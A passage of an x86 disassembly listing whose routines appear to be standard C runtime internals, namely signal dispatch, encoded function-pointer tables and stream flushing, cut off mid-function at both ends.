  409bde:	85 db                	test   %ebx,%ebx
  409be0:	74 0e                	je     0x409bf0
  409be2:	8b cb                	mov    %ebx,%ecx
  409be4:	ff 15 24 f2 40 00    	call   *0x40f224
  409bea:	ff d3                	call   *%ebx
  409bec:	84 c0                	test   %al,%al
  409bee:	74 08                	je     0x409bf8
  409bf0:	83 c6 08             	add    $0x8,%esi
  409bf3:	3b 75 0c             	cmp    0xc(%ebp),%esi
  409bf6:	75 e4                	jne    0x409bdc
  409bf8:	3b 75 0c             	cmp    0xc(%ebp),%esi
  409bfb:	74 2e                	je     0x409c2b
  409bfd:	3b f7                	cmp    %edi,%esi
  409bff:	74 26                	je     0x409c27
  409c01:	83 c6 fc             	add    $0xfffffffc,%esi
  409c04:	83 7e fc 00          	cmpl   $0x0,-0x4(%esi)
  409c08:	74 13                	je     0x409c1d
  409c0a:	8b 1e                	mov    (%esi),%ebx
  409c0c:	85 db                	test   %ebx,%ebx
  409c0e:	74 0d                	je     0x409c1d
  409c10:	6a 00                	push   $0x0
  409c12:	8b cb                	mov    %ebx,%ecx
  409c14:	ff 15 24 f2 40 00    	call   *0x40f224
  409c1a:	ff d3                	call   *%ebx
  409c1c:	59                   	pop    %ecx
  409c1d:	83 ee 08             	sub    $0x8,%esi
  409c20:	8d 46 04             	lea    0x4(%esi),%eax
  409c23:	3b c7                	cmp    %edi,%eax
  409c25:	75 dd                	jne    0x409c04
  409c27:	32 c0                	xor    %al,%al
  409c29:	eb 02                	jmp    0x409c2d
  409c2b:	b0 01                	mov    $0x1,%al
  409c2d:	5f                   	pop    %edi
  409c2e:	5e                   	pop    %esi
  409c2f:	5b                   	pop    %ebx
  409c30:	5d                   	pop    %ebp
  409c31:	c3                   	ret
  409c32:	8b ff                	mov    %edi,%edi
  409c34:	55                   	push   %ebp
  409c35:	8b ec                	mov    %esp,%ebp
  409c37:	56                   	push   %esi
  409c38:	8b 75 0c             	mov    0xc(%ebp),%esi
  409c3b:	39 75 08             	cmp    %esi,0x8(%ebp)
  409c3e:	74 1e                	je     0x409c5e
  409c40:	57                   	push   %edi
  409c41:	8b 7e fc             	mov    -0x4(%esi),%edi
  409c44:	85 ff                	test   %edi,%edi
  409c46:	74 0d                	je     0x409c55
  409c48:	6a 00                	push   $0x0
  409c4a:	8b cf                	mov    %edi,%ecx
  409c4c:	ff 15 24 f2 40 00    	call   *0x40f224
  409c52:	ff d7                	call   *%edi
  409c54:	59                   	pop    %ecx
  409c55:	83 ee 08             	sub    $0x8,%esi
  409c58:	3b 75 08             	cmp    0x8(%ebp),%esi
  409c5b:	75 e4                	jne    0x409c41
  409c5d:	5f                   	pop    %edi
  409c5e:	b0 01                	mov    $0x1,%al
  409c60:	5e                   	pop    %esi
  409c61:	5d                   	pop    %ebp
  409c62:	c3                   	ret
  409c63:	6a 0c                	push   $0xc
  409c65:	68 d8 4a 41 00       	push   $0x414ad8
  409c6a:	e8 81 a5 ff ff       	call   0x4041f0
  409c6f:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  409c73:	8b 45 08             	mov    0x8(%ebp),%eax
  409c76:	ff 30                	push   (%eax)
  409c78:	e8 40 dd ff ff       	call   0x4079bd
  409c7d:	59                   	pop    %ecx
  409c7e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409c82:	8b 35 04 60 41 00    	mov    0x416004,%esi
  409c88:	8b ce                	mov    %esi,%ecx
  409c8a:	83 e1 1f             	and    $0x1f,%ecx
  409c8d:	33 35 e0 72 41 00    	xor    0x4172e0,%esi
  409c93:	d3 ce                	ror    %cl,%esi
  409c95:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409c98:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409c9f:	e8 17 00 00 00       	call   0x409cbb
  409ca4:	8b c6                	mov    %esi,%eax
  409ca6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409ca9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409cb0:	59                   	pop    %ecx
  409cb1:	5f                   	pop    %edi
  409cb2:	5e                   	pop    %esi
  409cb3:	5b                   	pop    %ebx
  409cb4:	c9                   	leave
  409cb5:	c2 0c 00             	ret    $0xc
  409cb8:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  409cbb:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409cbe:	ff 31                	push   (%ecx)
  409cc0:	e8 40 dd ff ff       	call   0x407a05
  409cc5:	59                   	pop    %ecx
  409cc6:	c3                   	ret
  409cc7:	8b ff                	mov    %edi,%edi
  409cc9:	55                   	push   %ebp
  409cca:	8b ec                	mov    %esp,%ebp
  409ccc:	8b 45 08             	mov    0x8(%ebp),%eax
  409ccf:	48                   	dec    %eax
  409cd0:	83 e8 01             	sub    $0x1,%eax
  409cd3:	74 2d                	je     0x409d02
  409cd5:	83 e8 04             	sub    $0x4,%eax
  409cd8:	74 21                	je     0x409cfb
  409cda:	83 e8 09             	sub    $0x9,%eax
  409cdd:	74 15                	je     0x409cf4
  409cdf:	83 e8 06             	sub    $0x6,%eax
  409ce2:	74 09                	je     0x409ced
  409ce4:	83 e8 01             	sub    $0x1,%eax
  409ce7:	74 12                	je     0x409cfb
  409ce9:	33 c0                	xor    %eax,%eax
  409ceb:	5d                   	pop    %ebp
  409cec:	c3                   	ret
  409ced:	b8 dc 72 41 00       	mov    $0x4172dc,%eax
  409cf2:	5d                   	pop    %ebp
  409cf3:	c3                   	ret
  409cf4:	b8 e4 72 41 00       	mov    $0x4172e4,%eax
  409cf9:	5d                   	pop    %ebp
  409cfa:	c3                   	ret
  409cfb:	b8 e0 72 41 00       	mov    $0x4172e0,%eax
  409d00:	5d                   	pop    %ebp
  409d01:	c3                   	ret
  409d02:	b8 d8 72 41 00       	mov    $0x4172d8,%eax
  409d07:	5d                   	pop    %ebp
  409d08:	c3                   	ret
  409d09:	8b ff                	mov    %edi,%edi
  409d0b:	55                   	push   %ebp
  409d0c:	8b ec                	mov    %esp,%ebp
  409d0e:	6b 0d 58 fe 40 00 0c 	imul   $0xc,0x40fe58,%ecx
  409d15:	8b 45 0c             	mov    0xc(%ebp),%eax
  409d18:	03 c8                	add    %eax,%ecx
  409d1a:	3b c1                	cmp    %ecx,%eax
  409d1c:	74 0f                	je     0x409d2d
  409d1e:	8b 55 08             	mov    0x8(%ebp),%edx
  409d21:	39 50 04             	cmp    %edx,0x4(%eax)
  409d24:	74 09                	je     0x409d2f
  409d26:	83 c0 0c             	add    $0xc,%eax
  409d29:	3b c1                	cmp    %ecx,%eax
  409d2b:	75 f4                	jne    0x409d21
  409d2d:	33 c0                	xor    %eax,%eax
  409d2f:	5d                   	pop    %ebp
  409d30:	c3                   	ret
  409d31:	8b ff                	mov    %edi,%edi
  409d33:	55                   	push   %ebp
  409d34:	8b ec                	mov    %esp,%ebp
  409d36:	83 ec 0c             	sub    $0xc,%esp
  409d39:	6a 03                	push   $0x3
  409d3b:	58                   	pop    %eax
  409d3c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409d3f:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  409d42:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409d45:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409d48:	50                   	push   %eax
  409d49:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409d4c:	50                   	push   %eax
  409d4d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409d50:	50                   	push   %eax
  409d51:	e8 0d ff ff ff       	call   0x409c63
  409d56:	c9                   	leave
  409d57:	c3                   	ret
  409d58:	8b ff                	mov    %edi,%edi
  409d5a:	55                   	push   %ebp
  409d5b:	8b ec                	mov    %esp,%ebp
  409d5d:	8b 45 08             	mov    0x8(%ebp),%eax
  409d60:	a3 d8 72 41 00       	mov    %eax,0x4172d8
  409d65:	a3 dc 72 41 00       	mov    %eax,0x4172dc
  409d6a:	a3 e0 72 41 00       	mov    %eax,0x4172e0
  409d6f:	a3 e4 72 41 00       	mov    %eax,0x4172e4
  409d74:	5d                   	pop    %ebp
  409d75:	c3                   	ret
  409d76:	6a 24                	push   $0x24
  409d78:	68 b8 4a 41 00       	push   $0x414ab8
  409d7d:	e8 6e a4 ff ff       	call   0x4041f0
  409d82:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  409d86:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  409d8a:	b1 01                	mov    $0x1,%cl
  409d8c:	88 4d e7             	mov    %cl,-0x19(%ebp)
  409d8f:	8b 75 08             	mov    0x8(%ebp),%esi
  409d92:	6a 08                	push   $0x8
  409d94:	5b                   	pop    %ebx
  409d95:	3b f3                	cmp    %ebx,%esi
  409d97:	7f 18                	jg     0x409db1
  409d99:	74 37                	je     0x409dd2
  409d9b:	8d 46 ff             	lea    -0x1(%esi),%eax
  409d9e:	83 e8 01             	sub    $0x1,%eax
  409da1:	74 22                	je     0x409dc5
  409da3:	48                   	dec    %eax
  409da4:	83 e8 01             	sub    $0x1,%eax
  409da7:	74 29                	je     0x409dd2
  409da9:	48                   	dec    %eax
  409daa:	83 e8 01             	sub    $0x1,%eax
  409dad:	75 47                	jne    0x409df6
  409daf:	eb 14                	jmp    0x409dc5
  409db1:	83 fe 0b             	cmp    $0xb,%esi
  409db4:	74 1c                	je     0x409dd2
  409db6:	83 fe 0f             	cmp    $0xf,%esi
  409db9:	74 0a                	je     0x409dc5
  409dbb:	83 fe 14             	cmp    $0x14,%esi
  409dbe:	7e 36                	jle    0x409df6
  409dc0:	83 fe 16             	cmp    $0x16,%esi
  409dc3:	7f 31                	jg     0x409df6
  409dc5:	56                   	push   %esi
  409dc6:	e8 fc fe ff ff       	call   0x409cc7
  409dcb:	83 c4 04             	add    $0x4,%esp
  409dce:	8b f8                	mov    %eax,%edi
  409dd0:	eb 3e                	jmp    0x409e10
  409dd2:	e8 80 d3 ff ff       	call   0x407157
  409dd7:	8b f8                	mov    %eax,%edi
  409dd9:	89 7d e0             	mov    %edi,-0x20(%ebp)
  409ddc:	85 ff                	test   %edi,%edi
  409dde:	75 08                	jne    0x409de8
  409de0:	83 c8 ff             	or     $0xffffffff,%eax
  409de3:	e9 5d 01 00 00       	jmp    0x409f45
  409de8:	ff 37                	push   (%edi)
  409dea:	56                   	push   %esi
  409deb:	e8 19 ff ff ff       	call   0x409d09
  409df0:	59                   	pop    %ecx
  409df1:	59                   	pop    %ecx
  409df2:	85 c0                	test   %eax,%eax
  409df4:	75 12                	jne    0x409e08
  409df6:	e8 c0 d6 ff ff       	call   0x4074bb
  409dfb:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  409e01:	e8 f8 d5 ff ff       	call   0x4073fe
  409e06:	eb d8                	jmp    0x409de0
  409e08:	8d 78 08             	lea    0x8(%eax),%edi
  409e0b:	32 c9                	xor    %cl,%cl
  409e0d:	88 4d e7             	mov    %cl,-0x19(%ebp)
  409e10:	89 7d dc             	mov    %edi,-0x24(%ebp)
  409e13:	83 65 d4 00          	andl   $0x0,-0x2c(%ebp)
  409e17:	84 c9                	test   %cl,%cl
  409e19:	74 0b                	je     0x409e26
  409e1b:	6a 03                	push   $0x3
  409e1d:	e8 9b db ff ff       	call   0x4079bd
  409e22:	59                   	pop    %ecx
  409e23:	8a 4d e7             	mov    -0x19(%ebp),%cl
  409e26:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  409e2a:	c6 45 e6 00          	movb   $0x0,-0x1a(%ebp)
  409e2e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409e32:	8b 3f                	mov    (%edi),%edi
  409e34:	84 c9                	test   %cl,%cl
  409e36:	74 14                	je     0x409e4c
  409e38:	8b 0d 04 60 41 00    	mov    0x416004,%ecx
  409e3e:	83 e1 1f             	and    $0x1f,%ecx
  409e41:	33 3d 04 60 41 00    	xor    0x416004,%edi
  409e47:	d3 cf                	ror    %cl,%edi
  409e49:	8a 4d e7             	mov    -0x19(%ebp),%cl
  409e4c:	89 7d d8             	mov    %edi,-0x28(%ebp)
  409e4f:	83 ff 01             	cmp    $0x1,%edi
  409e52:	0f 94 c0             	sete   %al
  409e55:	88 45 e6             	mov    %al,-0x1a(%ebp)
  409e58:	84 c0                	test   %al,%al
  409e5a:	75 71                	jne    0x409ecd
  409e5c:	85 ff                	test   %edi,%edi
  409e5e:	0f 84 f1 00 00 00    	je     0x409f55
  409e64:	3b f3                	cmp    %ebx,%esi
  409e66:	74 0a                	je     0x409e72
  409e68:	83 fe 0b             	cmp    $0xb,%esi
  409e6b:	74 05                	je     0x409e72
  409e6d:	83 fe 04             	cmp    $0x4,%esi
  409e70:	75 28                	jne    0x409e9a
  409e72:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409e75:	8b 48 04             	mov    0x4(%eax),%ecx
  409e78:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  409e7b:	83 60 04 00          	andl   $0x0,0x4(%eax)
  409e7f:	3b f3                	cmp    %ebx,%esi
  409e81:	75 40                	jne    0x409ec3
  409e83:	e8 78 d1 ff ff       	call   0x407000
  409e88:	8b 40 08             	mov    0x8(%eax),%eax
  409e8b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  409e8e:	e8 6d d1 ff ff       	call   0x407000
  409e93:	c7 40 08 8c 00 00 00 	movl   $0x8c,0x8(%eax)
  409e9a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409e9d:	3b f3                	cmp    %ebx,%esi
  409e9f:	75 22                	jne    0x409ec3
  409ea1:	6b 0d 5c fe 40 00 0c 	imul   $0xc,0x40fe5c,%ecx
  409ea8:	03 08                	add    (%eax),%ecx
  409eaa:	6b 05 60 fe 40 00 0c 	imul   $0xc,0x40fe60,%eax
  409eb1:	03 c1                	add    %ecx,%eax
  409eb3:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  409eb6:	3b c8                	cmp    %eax,%ecx
  409eb8:	74 13                	je     0x409ecd
  409eba:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  409ebe:	83 c1 0c             	add    $0xc,%ecx
  409ec1:	eb f0                	jmp    0x409eb3
  409ec3:	a1 04 60 41 00       	mov    0x416004,%eax
  409ec8:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  409ecb:	89 01                	mov    %eax,(%ecx)
  409ecd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409ed4:	e8 29 00 00 00       	call   0x409f02
  409ed9:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  409edd:	75 64                	jne    0x409f43
  409edf:	3b f3                	cmp    %ebx,%esi
  409ee1:	75 2e                	jne    0x409f11
  409ee3:	e8 18 d1 ff ff       	call   0x407000
  409ee8:	ff 70 08             	push   0x8(%eax)
  409eeb:	53                   	push   %ebx
  409eec:	8b cf                	mov    %edi,%ecx
  409eee:	ff 15 24 f2 40 00    	call   *0x40f224
  409ef4:	ff d7                	call   *%edi
  409ef6:	59                   	pop    %ecx
  409ef7:	eb 23                	jmp    0x409f1c
  409ef9:	6a 08                	push   $0x8
  409efb:	5b                   	pop    %ebx
  409efc:	8b 75 08             	mov    0x8(%ebp),%esi
  409eff:	8b 7d d8             	mov    -0x28(%ebp),%edi
  409f02:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  409f06:	74 08                	je     0x409f10
  409f08:	6a 03                	push   $0x3
  409f0a:	e8 f6 da ff ff       	call   0x407a05
  409f0f:	59                   	pop    %ecx
  409f10:	c3                   	ret
  409f11:	56                   	push   %esi
  409f12:	8b cf                	mov    %edi,%ecx
  409f14:	ff 15 24 f2 40 00    	call   *0x40f224
  409f1a:	ff d7                	call   *%edi
  409f1c:	59                   	pop    %ecx
  409f1d:	3b f3                	cmp    %ebx,%esi
  409f1f:	74 0a                	je     0x409f2b
  409f21:	83 fe 0b             	cmp    $0xb,%esi
  409f24:	74 05                	je     0x409f2b
  409f26:	83 fe 04             	cmp    $0x4,%esi
  409f29:	75 18                	jne    0x409f43
  409f2b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409f2e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  409f31:	89 48 04             	mov    %ecx,0x4(%eax)
  409f34:	3b f3                	cmp    %ebx,%esi
  409f36:	75 0b                	jne    0x409f43
  409f38:	e8 c3 d0 ff ff       	call   0x407000
  409f3d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  409f40:	89 48 08             	mov    %ecx,0x8(%eax)
  409f43:	33 c0                	xor    %eax,%eax
  409f45:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409f48:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409f4f:	59                   	pop    %ecx
  409f50:	5f                   	pop    %edi
  409f51:	5e                   	pop    %esi
  409f52:	5b                   	pop    %ebx
  409f53:	c9                   	leave
  409f54:	c3                   	ret
  409f55:	84 c9                	test   %cl,%cl
  409f57:	74 08                	je     0x409f61
  409f59:	6a 03                	push   $0x3
  409f5b:	e8 a5 da ff ff       	call   0x407a05
  409f60:	59                   	pop    %ecx
  409f61:	6a 03                	push   $0x3
  409f63:	e8 c1 c4 ff ff       	call   0x406429
  409f68:	cc                   	int3
  409f69:	6a 08                	push   $0x8
  409f6b:	68 f8 4a 41 00       	push   $0x414af8
  409f70:	e8 7b a2 ff ff       	call   0x4041f0
  409f75:	8b 45 08             	mov    0x8(%ebp),%eax
  409f78:	ff 30                	push   (%eax)
  409f7a:	e8 91 03 00 00       	call   0x40a310
  409f7f:	59                   	pop    %ecx
  409f80:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409f84:	8b 75 0c             	mov    0xc(%ebp),%esi
  409f87:	ff 76 04             	push   0x4(%esi)
  409f8a:	8b 06                	mov    (%esi),%eax
  409f8c:	ff 30                	push   (%eax)
  409f8e:	e8 5b 01 00 00       	call   0x40a0ee
  409f93:	59                   	pop    %ecx
  409f94:	59                   	pop    %ecx
  409f95:	84 c0                	test   %al,%al
  409f97:	74 32                	je     0x409fcb
  409f99:	8b 46 08             	mov    0x8(%esi),%eax
  409f9c:	80 38 00             	cmpb   $0x0,(%eax)
  409f9f:	75 0e                	jne    0x409faf
  409fa1:	8b 06                	mov    (%esi),%eax
  409fa3:	8b 00                	mov    (%eax),%eax
  409fa5:	8b 40 0c             	mov    0xc(%eax),%eax
  409fa8:	90                   	nop
  409fa9:	d1 e8                	shr    $1,%eax
  409fab:	a8 01                	test   $0x1,%al
  409fad:	74 1c                	je     0x409fcb
  409faf:	8b 06                	mov    (%esi),%eax
  409fb1:	ff 30                	push   (%eax)
  409fb3:	e8 f3 01 00 00       	call   0x40a1ab
  409fb8:	59                   	pop    %ecx
  409fb9:	83 f8 ff             	cmp    $0xffffffff,%eax
  409fbc:	74 07                	je     0x409fc5
  409fbe:	8b 46 04             	mov    0x4(%esi),%eax
  409fc1:	ff 00                	incl   (%eax)
  409fc3:	eb 06                	jmp    0x409fcb
  409fc5:	8b 46 0c             	mov    0xc(%esi),%eax
  409fc8:	83 08 ff             	orl    $0xffffffff,(%eax)
  409fcb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409fd2:	e8 12 00 00 00       	call   0x409fe9
  409fd7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409fda:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409fe1:	59                   	pop    %ecx
  409fe2:	5f                   	pop    %edi
  409fe3:	5e                   	pop    %esi
  409fe4:	5b                   	pop    %ebx
  409fe5:	c9                   	leave
  409fe6:	c2 0c 00             	ret    $0xc
  409fe9:	8b 45 10             	mov    0x10(%ebp),%eax
  409fec:	ff 30                	push   (%eax)
  409fee:	e8 31 03 00 00       	call   0x40a324
  409ff3:	59                   	pop    %ecx
  409ff4:	c3                   	ret
  409ff5:	6a 2c                	push   $0x2c
  409ff7:	68 18 4b 41 00       	push   $0x414b18
  409ffc:	e8 ef a1 ff ff       	call   0x4041f0
  40a001:	8b 45 08             	mov    0x8(%ebp),%eax
  40a004:	ff 30                	push   (%eax)
  40a006:	e8 b2 d9 ff ff       	call   0x4079bd
  40a00b:	59                   	pop    %ecx
  40a00c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40a010:	8b 35 ec 72 41 00    	mov    0x4172ec,%esi
  40a016:	a1 e8 72 41 00       	mov    0x4172e8,%eax
  40a01b:	8d 1c 86             	lea    (%esi,%eax,4),%ebx
  40a01e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a021:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40a024:	3b f3                	cmp    %ebx,%esi
  40a026:	74 4f                	je     0x40a077
  40a028:	8b 06                	mov    (%esi),%eax
  40a02a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40a02d:	ff 37                	push   (%edi)
  40a02f:	50                   	push   %eax
  40a030:	e8 b9 00 00 00       	call   0x40a0ee
  40a035:	59                   	pop    %ecx
  40a036:	59                   	pop    %ecx
  40a037:	84 c0                	test   %al,%al
  40a039:	74 37                	je     0x40a072
  40a03b:	8b 57 08             	mov    0x8(%edi),%edx
  40a03e:	8b 4f 04             	mov    0x4(%edi),%ecx
  40a041:	8b 07                	mov    (%edi),%eax
  40a043:	8d 7d e0             	lea    -0x20(%ebp),%edi
  40a046:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  40a049:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40a04c:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  40a04f:	89 55 d0             	mov    %edx,-0x30(%ebp)
  40a052:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40a055:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40a058:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40a05b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a05e:	50                   	push   %eax
  40a05f:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a062:	50                   	push   %eax
  40a063:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40a066:	50                   	push   %eax
  40a067:	8d 4d e7             	lea    -0x19(%ebp),%ecx
  40a06a:	e8 fa fe ff ff       	call   0x409f69
  40a06f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a072:	83 c6 04             	add    $0x4,%esi
  40a075:	eb aa                	jmp    0x40a021
  40a077:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40a07e:	e8 12 00 00 00       	call   0x40a095
  40a083:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a086:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a08d:	59                   	pop    %ecx
  40a08e:	5f                   	pop    %edi
  40a08f:	5e                   	pop    %esi
  40a090:	5b                   	pop    %ebx
  40a091:	c9                   	leave
  40a092:	c2 0c 00             	ret    $0xc
  40a095:	8b 45 10             	mov    0x10(%ebp),%eax
  40a098:	ff 30                	push   (%eax)
  40a09a:	e8 66 d9 ff ff       	call   0x407a05
  40a09f:	59                   	pop    %ecx
  40a0a0:	c3                   	ret
  40a0a1:	8b ff                	mov    %edi,%edi
  40a0a3:	55                   	push   %ebp
  40a0a4:	8b ec                	mov    %esp,%ebp
  40a0a6:	83 ec 20             	sub    $0x20,%esp
  40a0a9:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40a0ad:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40a0b0:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  40a0b4:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40a0b7:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40a0ba:	8d 45 08             	lea    0x8(%ebp),%eax
  40a0bd:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40a0c0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40a0c3:	6a 08                	push   $0x8
  40a0c5:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40a0c8:	58                   	pop    %eax
  40a0c9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40a0cc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40a0cf:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a0d2:	50                   	push   %eax
  40a0d3:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a0d6:	50                   	push   %eax
  40a0d7:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40a0da:	50                   	push   %eax
  40a0db:	e8 15 ff ff ff       	call   0x409ff5
  40a0e0:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  40a0e4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a0e7:	75 03                	jne    0x40a0ec
  40a0e9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a0ec:	c9                   	leave
  40a0ed:	c3                   	ret
  40a0ee:	8b ff                	mov    %edi,%edi
  40a0f0:	55                   	push   %ebp
  40a0f1:	8b ec                	mov    %esp,%ebp
  40a0f3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a0f6:	85 c0                	test   %eax,%eax
  40a0f8:	74 1f                	je     0x40a119
  40a0fa:	8b 48 0c             	mov    0xc(%eax),%ecx
  40a0fd:	90                   	nop
  40a0fe:	8b c1                	mov    %ecx,%eax
  40a100:	c1 e8 0d             	shr    $0xd,%eax
  40a103:	a8 01                	test   $0x1,%al
  40a105:	74 12                	je     0x40a119
  40a107:	51                   	push   %ecx
  40a108:	e8 14 00 00 00       	call   0x40a121
  40a10d:	83 c4 04             	add    $0x4,%esp
  40a110:	84 c0                	test   %al,%al
  40a112:	75 09                	jne    0x40a11d
  40a114:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a117:	ff 00                	incl   (%eax)
  40a119:	32 c0                	xor    %al,%al
  40a11b:	5d                   	pop    %ebp
  40a11c:	c3                   	ret
  40a11d:	b0 01                	mov    $0x1,%al
  40a11f:	5d                   	pop    %ebp
  40a120:	c3                   	ret
  40a121:	8b ff                	mov    %edi,%edi
  40a123:	55                   	push   %ebp
  40a124:	8b ec                	mov    %esp,%ebp
  40a126:	8b 45 08             	mov    0x8(%ebp),%eax
  40a129:	24 03                	and    $0x3,%al
  40a12b:	3c 02                	cmp    $0x2,%al
  40a12d:	75 06                	jne    0x40a135
  40a12f:	f6 45 08 c0          	testb  $0xc0,0x8(%ebp)
  40a133:	75 09                	jne    0x40a13e
  40a135:	f7 45 08 00 08 00 00 	testl  $0x800,0x8(%ebp)
  40a13c:	74 04                	je     0x40a142
  40a13e:	b0 01                	mov    $0x1,%al
  40a140:	5d                   	pop    %ebp
  40a141:	c3                   	ret
  40a142:	32 c0                	xor    %al,%al
  40a144:	5d                   	pop    %ebp
  40a145:	c3                   	ret
  40a146:	8b ff                	mov    %edi,%edi
  40a148:	55                   	push   %ebp
  40a149:	8b ec                	mov    %esp,%ebp
  40a14b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a14e:	56                   	push   %esi
  40a14f:	57                   	push   %edi
  40a150:	8d 71 0c             	lea    0xc(%ecx),%esi
  40a153:	8b 16                	mov    (%esi),%edx
  40a155:	90                   	nop
  40a156:	8b c2                	mov    %edx,%eax
  40a158:	24 03                	and    $0x3,%al
  40a15a:	3c 02                	cmp    $0x2,%al
  40a15c:	75 47                	jne    0x40a1a5
  40a15e:	f6 c2 c0             	test   $0xc0,%dl
  40a161:	74 42                	je     0x40a1a5
  40a163:	8b 39                	mov    (%ecx),%edi
  40a165:	8b 41 04             	mov    0x4(%ecx),%eax
  40a168:	2b f8                	sub    %eax,%edi
  40a16a:	89 01                	mov    %eax,(%ecx)
  40a16c:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  40a170:	85 ff                	test   %edi,%edi
  40a172:	7e 31                	jle    0x40a1a5
  40a174:	57                   	push   %edi
  40a175:	50                   	push   %eax
  40a176:	51                   	push   %ecx
  40a177:	e8 5e 07 00 00       	call   0x40a8da
  40a17c:	59                   	pop    %ecx
  40a17d:	50                   	push   %eax
  40a17e:	e8 09 1a 00 00       	call   0x40bb8c
  40a183:	83 c4 0c             	add    $0xc,%esp
  40a186:	3b f8                	cmp    %eax,%edi
  40a188:	74 0b                	je     0x40a195
  40a18a:	6a 10                	push   $0x10
  40a18c:	58                   	pop    %eax
  40a18d:	f0 09 06             	lock or %eax,(%esi)
  40a190:	83 c8 ff             	or     $0xffffffff,%eax
  40a193:	eb 12                	jmp    0x40a1a7
  40a195:	8b 06                	mov    (%esi),%eax
  40a197:	90                   	nop
  40a198:	c1 e8 02             	shr    $0x2,%eax
  40a19b:	a8 01                	test   $0x1,%al
  40a19d:	74 06                	je     0x40a1a5
  40a19f:	6a fd                	push   $0xfffffffd
  40a1a1:	58                   	pop    %eax
  40a1a2:	f0 21 06             	lock and %eax,(%esi)
  40a1a5:	33 c0                	xor    %eax,%eax
  40a1a7:	5f                   	pop    %edi
  40a1a8:	5e                   	pop    %esi
  40a1a9:	5d                   	pop    %ebp
  40a1aa:	c3                   	ret
  40a1ab:	8b ff                	mov    %edi,%edi
  40a1ad:	55                   	push   %ebp
  40a1ae:	8b ec                	mov    %esp,%ebp
  40a1b0:	56                   	push   %esi
  40a1b1:	8b 75 08             	mov    0x8(%ebp),%esi
  40a1b4:	85 f6                	test   %esi,%esi
  40a1b6:	75 09                	jne    0x40a1c1
  40a1b8:	56                   	push   %esi
  40a1b9:	e8 e3 fe ff ff       	call   0x40a0a1
  40a1be:	59                   	pop    %ecx
  40a1bf:	eb 2f                	jmp    0x40a1f0
  40a1c1:	56                   	push   %esi
  40a1c2:	e8 7f ff ff ff       	call   0x40a146
  40a1c7:	59                   	pop    %ecx
  40a1c8:	85 c0                	test   %eax,%eax
  40a1ca:	75 21                	jne    0x40a1ed
  40a1cc:	8b 46 0c             	mov    0xc(%esi),%eax
  40a1cf:	90                   	nop
